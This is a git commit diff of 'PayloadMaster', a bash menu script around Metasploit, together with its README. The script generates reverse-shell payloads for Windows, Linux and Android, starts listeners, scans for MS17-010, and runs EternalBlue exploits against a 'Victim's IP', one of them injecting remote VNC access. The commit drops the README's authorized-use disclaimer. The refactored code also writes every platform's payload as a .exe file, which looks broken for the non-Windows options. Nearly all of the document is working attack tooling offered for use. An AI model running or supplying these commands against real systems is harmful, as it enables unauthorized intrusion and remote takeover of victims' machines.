8547aa4062a59d0850744f5045aa53d86490e741
Draven <lohitkolluri@gmail.com>
2023-10-28 16:39:49 +0530

    Made Ui more User Friendly ✨

--- PayloadMaster.sh
+++ PayloadMaster.sh
@@ -3,17 +3,104 @@
 resize -s 27 80
 clear
 
-ip=$(hostname -I | cut -d' ' -f1)
+# Determine the local IP address for Linux and macOS
+if [ "$(uname)" == "Darwin" ]; then
+  ip=$(ipconfig getifaddr en0) # Use 'en0' or 'en1' depending on your active network interface on macOS.
+else
+  ip=$(hostname -I | cut -d' ' -f1) # For Linux
+fi
 
-service postgresql start
+# Function to create a Metasploit payload and listener
+function create_payload {
+  echo "Select the platform:"
+  echo "  (1) Windows"
+  echo "  (2) Linux"
+  echo "  (3) Android"
+  read -p "Platform: " platform
 
-function create_windows_payload {
+  case $platform in
+    1)
+      platform_name="windows"
+      ;;
+    2)
+      platform_name="linux"
+      ;;
+    3)
+      platform_name="android"
+      ;;
+    *)
+      echo "Invalid platform selection."
+      return
+      ;;
+  esac
+
+  case $platform_name in
+    "windows")
+      echo "Select the payload type for Windows:"
+      echo "  (1) meterpreter/reverse_tcp"
+      echo "  (2) shell_reverse_tcp"
+      read -p "Payload type: " payload_type
+
+      case $payload_type in
+        1)
+          payload_type="meterpreter/reverse_tcp"
+          ;;
+        2)
+          payload_type="shell_reverse_tcp"
+          ;;
+        *)
+          echo "Invalid payload type selection for Windows."
+          return
+          ;;
+      esac
+      ;;
+    "linux")
+      echo "Select the payload type for Linux:"
+      echo "  (1) meterpreter/reverse_tcp"
+      echo "  (2) shell_reverse_tcp"
+      read -p "Payload type: " payload_type
+
+      case $payload_type in
+        1)
+          payload_type="meterpreter/reverse_tcp"
+          ;;
+        2)
+          payload_type="shell_reverse_tcp"
+          ;;
+        *)
+          echo "Invalid payload type selection for Linux."
+          return
+          ;;
+      esac
+      ;;
+    "android")
+      echo "Select the payload type for Android:"
+      echo "  (1) meterpreter/reverse_tcp"
+      echo "  (2) shell_reverse_tcp"
+      read -p "Payload type: " payload_type
+
+      case $payload_type in
+        1)
+          payload_type="meterpreter/reverse_tcp"
+          ;;
+        2)
+          payload_type="shell_reverse_tcp"
+          ;;
+        *)
+          echo "Invalid payload type selection for Android."
+          return
+          ;;
+      esac
+      ;;
+  esac
+
   read -p "Enter the name of the payload (without extension): " payload_name
   read -p "Enter the payload LHOST [$ip]: " lhost_payload
   lhost_payload=${lhost_payload:-$ip}
   read -p "Enter the payload LPORT [4444]: " lport_payload
   lport_payload=${lport_payload:-4444}
-  msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost_payload LPORT=$lport_payload -f exe > "$payload_name.exe"
+
+  msfvenom -p $platform_name/$payload_type LHOST=$lhost_payload LPORT=$lport_payload -f exe > "$payload_name.exe"
 
   read -p "Use the same LHOST and LPORT for the listener? [Y/n]: " same_host_port
   if [[ $same_host_port =~ ^[Yy]$ ]] || [[ -z $same_host_port ]]; then
@@ -24,119 +111,31 @@ function create_windows_payload {
     read -p "Enter the listener LPORT: " lport_listener
   fi
 
-  msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST $lhost_listener; set LPORT $lport_listener; exploit;"
+  msfconsole -q -x "use exploit/multi/handler; set payload $platform_name/$payload_type; set LHOST $lhost_listener; set LPORT $lport_listener; exploit;"
 }
 
-function create_android_payload {
-  read -p "Enter the name of the payload (without extension): " payload_name
-  read -p "Enter the payload LHOST [$ip]: " lhost_payload
-  lhost_payload=${lhost_payload:-$ip}
-  read -p "Enter the payload LPORT [4444]: " lport_payload
-  lport_payload=${lport_payload:-4444}
-  msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost_payload LPORT=$lport_payload > "$payload_name.apk"
-
-  read -p "Use the same LHOST and LPORT for the listener? [Y/n]: " same_host_port
-  if [[ $same_host_port =~ ^[Yy]$ ]] || [[ -z $same_host_port ]]; then
-    lhost_listener=$lhost_payload
-    lport_listener=$lport_payload
-  else
-    read -p "Enter the listener LHOST: " lhost_listener
-    read -p "Enter the listener LPORT: " lport_listener
-  fi
-
-  msfconsole -q -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST $lhost_listener; set LPORT $lport_listener; exploit;"
-}
-
-function create_linux_payload {
-  read -p "Enter the name of the payload (without extension): " payload_name
-  read -p "Enter the payload LHOST [$ip]: " lhost_payload
-  lhost_payload=${lhost_payload:-$ip}
-  read -p "Enter the payload LPORT [4444]: " lport_payload
-  lport_payload=${lport_payload:-4444}
-  msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$lhost_payload LPORT=$lport_payload -f elf > "$payload_name.elf"
-
-  read -p "Use the same LHOST and LPORT for the listener? [Y/n]: " same_host_port
-  if [[ $same_host_port =~ ^[Yy]$ ]] || [[ -z $same_host_port ]]; then
-    lhost_listener=$lhost_payload
-    lport_listener=$lport_payload
-  else
-    read -p "Enter the listener LHOST: " lhost_listener
-    read -p "Enter the listener LPORT: " lport_listener
-  fi
-
-  msfconsole -q -x "use exploit/multi/handler; set payload linux/x86/meterpreter/reverse_tcp; set LHOST $lhost_listener; set LPORT $lport_listener; exploit;"
-}
-
-function create_macos_payload {
-  read -p "Enter the name of the payload (without extension): " payload_name
-  read -p "Enter the payload LHOST [$ip]: " lhost_payload
-  lhost_payload=${lhost_payload:-$ip}
-  read -p "Enter the payload LPORT [4444]: " lport_payload
-  lport_payload=${lport_payload:-4444}
-  msfvenom -p osx/x86/shell_reverse_tcp LHOST=$lhost_payload LPORT=$lport_payload -f macho > "$payload_name.macho"
-
-  read -p "Use the same LHOST and LPORT for the listener? [Y/n]: " same_host_port
-  if [[ $same_host_port =~ ^[Yy]$ ]] || [[ -z $same_host_port ]]; then
-    lhost_listener=$lhost_payload
-    lport_listener=$lport_payload
-  else
-    read -p "Enter the listener LHOST: " lhost_listener
-    read -p "Enter the listener LPORT: " lport_listener
-  fi
-
-  msfconsole -q -x "use exploit/multi/handler; set payload osx/x86/shell_reverse_tcp; set LHOST $lhost_listener; set LPORT $lport_listener; exploit;"
-}
-
-function create_web_payload {
-  read -p "Enter the name of the payload (without extension): " payload_name
-  read -p "Enter the payload LHOST [$ip]: " lhost_payload
-  lhost_payload=${lhost_payload:-$ip}
-  read -p "Enter the payload LPORT [80]: " lport_payload
-  lport_payload=${lport_payload:-80}
-  msfvenom -p php/meterpreter_reverse_tcp LHOST=$lhost_payload LPORT=$lport_payload -f raw > "$payload_name.php"
-
-  read -p "Use the same LHOST and LPORT for the listener? [Y/n]: " same_host_port
-  if [[ $same_host_port =~ ^[Yy]$ ]] || [[ -z $same_host_port ]]; then
-    lhost_listener=$lhost_payload
-    lport_listener=$lport_payload
-  else
-    read -p "Enter the listener LHOST: " lhost_listener
-    read -p "Enter the listener LPORT: " lport_listener
-  fi
-
-  msfconsole -q -x "use exploit/multi/handler; set payload php/meterpreter_reverse_tcp; set LHOST $lhost_listener; set LPORT $lport_listener; exploit;"
-}
-
+# Function to scan if a target is vulnerable to MS17-010
 function scan_vulnerable {
   echo "Victim's IP:"
   read r
   msfconsole -q -x "use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS $r; exploit; exit;"
 }
 
+# Function to exploit Windows with MS17-010 (EternalBlue)
 function exploit_windows {
   echo "Victim's IP:"
   read r
   msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set payload windows/x64/meterpreter/reverse_tcp; set LHOST $ip; set RHOST $r; exploit;"
 }
 
+# Function to enable Remote Desktop on a Windows target using MS17-010 (EternalBlue)
 function enable_remote_desktop {
   echo "Victim's IP:"
   read r
   msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set payload windows/x64/vncinject/reverse_tcp; set LHOST $ip; set RHOST $r; set viewonly false; exploit;"
 }
 
-function exploit_windows_psexec {
-  echo "Victim's IP:"
-  read r
-  msfconsole -q -x "use exploit/windows/smb/ms17_010_psexec; set LHOST $ip; set RHOST $r; exploit;"
-}
-
-function enable_remote_desktop_psexec {
-  echo "Victim's IP:"
-  read r
-  msfconsole -q -x "use exploit/windows/smb/ms17_010_psexec; set payload windows/vncinject/reverse_tcp; set LHOST $ip; set RHOST $r; set viewonly false; exploit;"
-}
-
+# Function to exploit Windows with a link (HTA Server)
 function exploit_windows_hta {
   echo "Uripath: (/)"
   read u
@@ -150,52 +149,28 @@ while true; do
   echo "        PayloadMaster       "
   echo "==========================="
   echo "Select an option:"
-  echo "  (1) Windows --> Create Windows payload and listener"
-  echo "  (2) Android --> Create Android payload and listener"
-  echo "  (3) Linux --> Create Linux payload and listener"
-  echo "  (4) MacOS --> Create MacOS payload and listener"
-  echo "  (5) Web --> Create Web payload and listener"
-  echo "  (6) Scan if a target is vulnerable to ms17_010"
-  echo "  (7) Exploit Windows 7/2008 x64 ONLY by IP (ms17_010_eternalblue)"
-  echo "  (8) Enable Remote Desktop (ms17_010_eternalblue)"
-  echo "  (9) Exploit Windows Vista/XP/2000/2003 ONLY by IP (ms17_010_psexec)"
-  echo "  (10) Enable Remote Desktop (ms17_010_psexec)"
-  echo "  (11) Exploit Windows with a link (HTA Server)"
+  echo "  (1) Create Payload and Listener"
+  echo "  (2) Scan if a target is vulnerable to MS17-010"
+  echo "  (3) Exploit Windows with MS17-010 (EternalBlue)"
+  echo "  (4) Enable Remote Desktop on a Windows target using MS17-010"
+  echo "  (5) Exploit Windows with a link (HTA Server)"
   echo "  (q) Quit"
   read -p "Choice: " x
 
   case $x in
     1)
-      create_windows_payload
+      create_payload
       ;;
     2)
-      create_android_payload
-      ;;
-    3)
-      create_linux_payload
-      ;;
-    4)
-      create_macos_payload
-      ;;
-    5)
-      create_web_payload
-      ;;
-    6)
       scan_vulnerable
       ;;
-    7)
+    3)
       exploit_windows
       ;;
-    8)
+    4)
       enable_remote_desktop
       ;;
-    9)
-      exploit_windows_psexec
-      ;;
-    10)
-      enable_remote_desktop_psexec
-      ;;
-    11)
+    5)
       exploit_windows_hta
       ;;
     q)
--- README.md
+++ README.md
@@ -1,62 +1,46 @@
+
 # PayloadMaster
 
-PayloadMaster is a script that allows you to create various types of payloads and listeners for different operating systems. It leverages Metasploit Framework's msfvenom and msfconsole to generate and handle the payloads.
+PayloadMaster is a bash script that simplifies the process of creating Metasploit payloads and setting up listeners for different platforms, scanning for MS17-010 vulnerabilities, and exploiting Windows targets using MS17-010 (EternalBlue).
 
 ## Prerequisites
 
-- Metasploit Framework: Make sure you have Metasploit Framework installed and set up on your system.
+- Metasploit Framework
+- Bash shell (Linux and macOS)
 
-## Installation
+## Usage
 
 1. Clone the repository:
+
    ```bash
    git clone https://github.com/lohitkolluri/PayloadMaster.git
    ```
 
-2. Change directory to the cloned repository:
+2. Navigate to the script directory:
+
    ```bash
-   cd PayloadMaster
+   cd payloadmaster
    ```
 
-## Usage
+3. Make the script executable:
 
-1. Give execute permissions to the script:
    ```bash
-   chmod +x PayloadMaster.sh
+   chmod +x payloadmaster.sh
    ```
 
-2. Run the script using the following command:
+4. Run the script:
+
    ```bash
-   ./PayloadMaster.sh
+   ./payloadmaster.sh
    ```
 
-3. Select an option from the menu to create a payload and listener for the desired target.
+5. Follow the on-screen instructions to create payloads, scan for vulnerabilities, and exploit targets.
 
-4. Follow the prompts to provide the necessary details such as payload name, LHOST, and LPORT.
+## Features
 
-5. If needed, configure the listener with different LHOST and LPORT.
-
-6. The script will generate the payload file and start the listener using msfconsole.
-
-7. Proceed with the instructions provided by the script and Metasploit Framework to exploit the target or test its vulnerability.
-
-## Options
-
-The script provides the following options:
-
-1. **Windows**: Create Windows payload and listener.
-2. **Android**: Create Android payload and listener.
-3. **Linux**: Create Linux payload and listener.
-4. **MacOS**: Create MacOS payload and listener.
-5. **Web**: Create Web payload and listener.
-6. **Scan if a target is vulnerable to ms17_010**: Perform an SMB vulnerability scan.
-7. **Exploit Windows 7/2008 x64 ONLY by IP (ms17_010_eternalblue)**: Exploit Windows 7/2008 x64 systems using the EternalBlue exploit.
-8. **Enable Remote Desktop (ms17_010_eternalblue)**: Enable Remote Desktop on exploited Windows 7/2008 x64 systems.
-9. **Exploit Windows Vista/XP/2000/2003 ONLY by IP (ms17_010_psexec)**: Exploit Windows Vista/XP/2000/2003 systems using the PSEXEC exploit.
-10. **Enable Remote Desktop (ms17_010_psexec)**: Enable Remote Desktop on exploited Windows Vista/XP/2000/2003 systems.
-11. **Exploit Windows with a link (HTA Server)**: Exploit Windows systems using an HTA Server.
-12. **Quit**: Quit the script.
-
-## Disclaimer
-
-This script is intended for educational and ethical purposes only. Use it responsibly and only on authorized systems.
+- Supports Windows, Linux, and Android platforms.
+- Allows you to choose the payload type based on the selected platform.
+- Scans for MS17-010 vulnerabilities.
+- Exploits Windows targets using MS17-010 (EternalBlue).
+- Enables Remote Desktop on Windows targets using MS17-010.
+- Creates payloads with a link (HTA Server).
